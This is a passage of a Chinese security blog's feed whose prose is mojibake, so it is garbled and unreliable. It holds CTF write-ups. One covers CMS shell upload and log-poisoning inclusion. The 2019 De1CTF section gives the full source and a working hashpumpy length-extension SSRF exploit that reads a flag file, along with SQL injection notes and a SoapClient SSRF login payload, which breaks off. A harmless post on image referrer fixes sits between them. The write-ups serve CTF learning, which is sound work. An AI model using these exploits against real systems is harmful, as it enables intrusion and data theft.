ï¼Œæ–‡ä»¶è·¯å¾„<code>/public/uploads/download/20191030/5db9681e2d701.php5</code></p><h2 id="ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ "><a href="#ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ "></a>ç™»å½•åå°æ–‡ä»¶ä¸Šä¼ </h2><p>ç™»å½•åuploadå¤„éšä¾¿ä¼ ï¼ŒåŒæ ·ç”¨php5æˆ–è€…php7å°±è¡Œï¼š</p><p>upload_pictureå¤„åº”è¯¥æœ‰åç¼€åç™½åå•ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-92dec9c7072c0adb.png" alt="image.png"></p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>å‡ºé¢˜äººé¢„æœŸè§£æ˜¯<code>/application/common/controller/base.php</code>ä¸­çš„<code>common_lists</code>æ–¹æ³•ï¼Œ$templateFileå¯ä»¥é€šè¿‡å‚æ•°ç»‘å®šæ–¹å¼æ§åˆ¶ï¼Œç”¨uaå¤´æŠŠå‘½ä»¤å†™æ—¥å¿—é‡Œç„¶ååŒ…å«æ—¥å¿—æ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™ä¸ªcmsæ´ç¡®å®æ¯”è¾ƒå¤šï¼Œä¸ç™»å½•ä¹Ÿèƒ½ä¼ shellï¼Œä¹Ÿèƒ½sqlæ³¨å…¥â€¦ adminç®¡ç†åå°ä¼°è®¡è¿˜æœ‰æ´ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexoå›¾ç‰‡å¤–é“¾è¢«é™åˆ¶è§£å†³æ–¹æ³•</title>
      <link href="/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2019/10/29/hexo%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE%E8%A2%AB%E9%99%90%E5%88%B6%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨ hexo+github æ­å»ºåšå®¢ï¼Œå›¾ç‰‡æˆä¸ºä¸€ä¸ªå¤´ç–¼çš„é—®é¢˜ï¼Œå¦‚æœæ”¾åœ¨ç›¸å¯¹ç›®å½•ä¸Šï¼Œé‚£ä¹ˆå›¾ç‰‡ä¼šå ç”¨ç©ºé—´ï¼Œæ–‡ç« å¤šäº†åŠ è½½ä¼šå˜æ…¢ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´ä½¿ç”¨ç®€ä¹¦çš„å›¾åºŠã€‚</p><p>ä½†æ˜¯å‘ç°hexoé‡ŒåŠ è½½ä¸å‡ºç®€ä¹¦å›¾åºŠä¸Šçš„å›¾ç‰‡ï¼Œæœç´¢äº†ä¸€æ³¢å‘ç°å¾®åšå›¾åºŠä¹Ÿæœ‰ç±»ä¼¼çš„é—®é¢˜ï¼Œæ‰¾åˆ°äº†åŸå› ï¼Œå…·ä½“å‚è€ƒï¼š</p><a id="more"></a><p><a href="https://blog.gobyte.cn/post/cfce32d8.html">https://blog.gobyte.cn/post/cfce32d8.html</a></p><p>ä½†æ˜¯ä¸Šè¿°é“¾æ¥çš„è„šæœ¬ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="comment">// éå†æ‰€æœ‰çš„imgæ ‡ç­¾</span></span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).each( <span class="function">(<span class="params">i,o</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">var</span> o = $(o);</span><br><span class="line">    <span class="comment">// åˆ¤æ–­å›¾ç‰‡çš„é“¾æ¥æ˜¯å¦åŒ…å«sinaimgå…³é”®å­—</span></span><br><span class="line"><span class="keyword">if</span>( o.attr(<span class="string">&quot;src&quot;</span>).indexOf(<span class="string">&quot;sinaimg&quot;</span>) &gt; <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="comment">// ç»™è¿™ä¸ªæ ‡ç­¾åŠ ä¸ŠreferrerPlicyå±æ€§</span></span><br><span class="line">o.attr(<span class="string">&quot;referrerpolicy&quot;</span>,<span class="string">&quot;no-referrer&quot;</span>);</span><br><span class="line">        <span class="comment">// å¤‡ä»½å›¾ç‰‡çš„src</span></span><br><span class="line">link = o.attr(<span class="string">&quot;src&quot;</span>);</span><br><span class="line">        <span class="comment">// é‡æ–°è®¾ç½®srcï¼Œè®©é¡µé¢é‡æ–°åŠ è½½ä¸€æ¬¡å›¾ç‰‡</span></span><br><span class="line">o.attr(<span class="string">&quot;src&quot;</span>,link);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æˆ‘å‘ç°å¹¶ä¸å¥½ç”¨ï¼Œç»è¿‡è°ƒè¯•å‘ç°$(â€œimgâ€)å¹¶ä¸èƒ½å–å¾—é¡µé¢æ‰€æœ‰çš„im gæ ‡ç­¾ï¼Œæˆ‘æ¢æˆäº†<code>document.getElementsByTagName(&#39;img&#39;)</code>çš„å½¢å¼ï¼Œå¯ä»¥å–å¾—æ‰€æœ‰çš„ img æ ‡ç­¾ï¼ˆæˆ‘ç”¨çš„æ˜¯ç®€ä¹¦å›¾åºŠï¼Œæ‰€ä»¥å…³é”®å­—æ˜¯jianshuï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">i=<span class="number">0</span>;i&lt;a.length;i++</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((a[i].src).indexOf(<span class="string">&quot;jianshu&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        a[i].referrerpolicy=<span class="string">&#x27;no-referrer&#x27;</span>;</span><br><span class="line">        link = a[i].src;</span><br><span class="line">        a[i].src = link;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°è¿˜æ˜¯æ— æ•ˆï¼Œä¸€é¡¿è°ƒè¯•å‘ç°æµè§ˆå™¨æ ¹æœ¬ä¸åƒä»£ç æ³¨é‡Šé‚£æ ·é¢é‡æ–°åŠ è½½ä¸€æ¬¡å›¾ç‰‡ï¼Œè€Œæ˜¯ä½¿ç”¨åŸæ¥çš„ç¼“å­˜ï¼ˆæ£€æµ‹åˆ°srcæ²¡æœ‰æ”¹å˜ï¼‰ï¼Œé‚å‚è€ƒå¦‚ä¸‹é“¾æ¥ï¼š<a href="https://blog.csdn.net/maoxunxing/article/details/40618617">https://blog.csdn.net/maoxunxing/article/details/40618617</a> è§£å†³ã€‚</p><p>ç”±äºç›´æ¥ä»ä¸Šä¼ åˆ°ç®€ä¹¦å›¾åºŠè·å¾—çš„é“¾æ¥ä¸­å·²ç»æœ‰?ä¸å‚æ•°ï¼Œæ‰€ä»¥è¦æŠŠåŸå…ˆé“¾æ¥çš„?åŠåé¢å‚æ•°åˆ é™¤ï¼ˆä¸å½±å“æ˜¾ç¤ºå›¾ç‰‡ï¼‰ã€‚</p><p>æ”¹ä¸Šå»å‘ç°è¿˜æ˜¯ä¸å¥½ä½¿orzï¼Œç»§ç»­è°ƒè¯•å‘ç°imgçš„æ ‡ç­¾referrerpolicyå·²ç»æ˜¯no-referrerï¼ŒæŠ“åŒ…è¿˜æ˜¯ä¼šæœ‰referå¤´ï¼Œé—®é¢˜å‡ºåœ¨è¿™é‡Œï¼Œä¸€é¡¿æµ‹åæ¥åœ¨æ–‡æ¡£é‡Œå‘ç°å±æ€§åº”è¯¥æ˜¯referrerPolicyâ€¦å¤§å†™çš„Pï¼Œæ²¡å†™è¿‡å‰ç«¯çš„ç—›ã€‚</p><p>è´´ä¸Šæœ€ç»ˆå¥½ç”¨çš„ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">i=<span class="number">0</span>;i&lt;a.length;i++</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((a[i].src).indexOf(<span class="string">&quot;jianshu&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        a[i].referrerPolicy=<span class="string">&#x27;no-referrer&#x27;</span>;</span><br><span class="line">        link = a[i].src;</span><br><span class="line">        a[i].src = link+<span class="string">&#x27;?t=&#x27;</span>+<span class="built_in">Math</span>.random();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> è§£å†³æ–¹æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 de1ctf</title>
      <link href="/2019/08/04/2019-de1ctf/"/>
      <url>/2019/08/04/2019-de1ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h3><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼š</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æ˜¯ ssrf è¯»æ–‡ä»¶+å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œè¿™é‡Œè¿‡æ»¤äº† file åè®®ï¼Œå‡ºé¢˜äººæœ¬æƒ³è€ƒCVE-2019-9948 ï¼Œä½¿ç”¨local_fileåè®®è¯»å–æ–‡ä»¶ï¼Œä½†æ˜¯urlopenç›´æ¥å¯ä»¥è¯»æ–‡ä»¶ï¼Œå¯¼è‡´äº†éé¢„æœŸã€‚ã€‚ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">param = <span class="string">&#x27;local_file:flag.txt&#x27;</span></span><br><span class="line"><span class="comment">#param = &quot;flag.txt&quot;ä¹Ÿå¯ä»¥</span></span><br><span class="line">hash_value = requests.get(<span class="string">&quot;http://139.180.128.86/geneSign&quot;</span>,params=&#123;<span class="string">&#x27;param&#x27;</span>:param&#125;).text</span><br><span class="line">new_hash_value,payload = hashpumpy.hashpump(hash_value,param+<span class="string">&quot;scan&quot;</span>,<span class="string">&quot;read&quot;</span>,<span class="number">16</span>)</span><br><span class="line">payload = quote(payload[<span class="built_in">len</span>(param):])</span><br><span class="line">a = requests.get(<span class="string">&quot;http://139.180.128.86/De1ta&quot;</span>,params=&#123;<span class="string">&#x27;param&#x27;</span>:param&#125;,cookies=&#123;<span class="string">&#x27;sign&#x27;</span>:new_hash_value,<span class="string">&#x27;action&#x27;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span> a.text</span><br></pre></td></tr></table></figure><h3 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h3><p>è¿™é¢˜æŠŠä¸¤ä¸ªé¢˜å¼ºè¡Œæ‹¼åˆ°ä¸€èµ·ï¼ŒåŠ åˆ°å†…ç½‘é‡Œâ€¦</p><p>å¼€å§‹å’Œ2018 n1ctf Easy&amp;&amp;Hard Php å‡ ä¹ä¸€æ ·ï¼Œå…·ä½“å‚è€ƒ<a href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148 </a>ï¼Œç›´æ¥æ‰“å°±å®Œäº‹äº†ã€‚</p><p>æºç æ³„éœ²æ‹¿åˆ°æºç ã€‚</p><p>å¼€å§‹ä¸çŸ¥é“æ˜¯åŸé¢˜æ”¹çš„ï¼Œå®¡ä»£ç ï¼Œå®¡äº†å¾ˆä¹…å‘ç° publishçš„signature å¤„æœ‰æ³¨å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;signature&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;mood&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood = addslashes(serialize(<span class="keyword">new</span> Mood((<span class="keyword">int</span>)$_POST[<span class="string">&#x27;mood&#x27;</span>],get_ip())));</span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">&#x27;userid&#x27;</span>,<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;signature&#x27;</span>,<span class="string">&#x27;mood&#x27;</span>),<span class="string">&#x27;ctf_user_signature&#x27;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">&#x27;signature&#x27;</span>],$mood));</span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;pic&#x27;</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                $dir=<span class="string">&#x27;/app/upload/&#x27;</span>;</span><br><span class="line">                move_uploaded_file($_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$dir.$_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.$_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;upload success&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ signature å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥ã€‚</p><p>æ³¨å‡ºç®¡ç†å‘˜å¯†ç ï¼Œmd5åè§£æ˜¯jaivypasswordï¼Œç™»å½•å‘ç°é™åˆ¶äº†ç™»å½•ipï¼Œå¡ä½ã€‚</p><p>æˆ‘çš„æ€è·¯ä¸€ç›´æ˜¯ insert è¯­å¥ä¸­æ‰§è¡Œ updateï¼ŒæŠŠæ•°æ®åº“ä¸­ç”¨æˆ·çš„ is_admin ç»™æ”¹æ‰ï¼Œè¯•äº†ä¸€ä¸‡å¹´ä¹Ÿä¸è¡Œã€‚ã€‚ã€‚ï¼ˆå¥½åƒæ˜¯åšä¸åˆ°çš„ï¼‰</p><p>ç›´åˆ°çœ‹åˆ°æ˜¯åŸé¢˜ï¼Œç…§ç€ä¸Šé¢çš„wpå¼€å§‹æ‰“ã€‚ã€‚ã€‚</p><p>æµè§ˆå™¨å…ˆæ‰“å¼€ç™»å½•é¡µé¢ï¼Œå¾—åˆ°PHPSESSIDæ˜¯f1vr5f8189lm6oqqtodqkvp7r6ï¼Œmd5æ˜¯070a7 ï¼Œçˆ†ç ´ä¸€ä¸‹éªŒè¯ç æ˜¯915720ï¼Œç„¶åç”Ÿæˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://127.0.0.1/index.php?action=login&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;username=admin&amp;password=jaivypassword&amp;code=915720&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=f1vr5f8189lm6oqqtodqkvp7r6&#x27;</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span 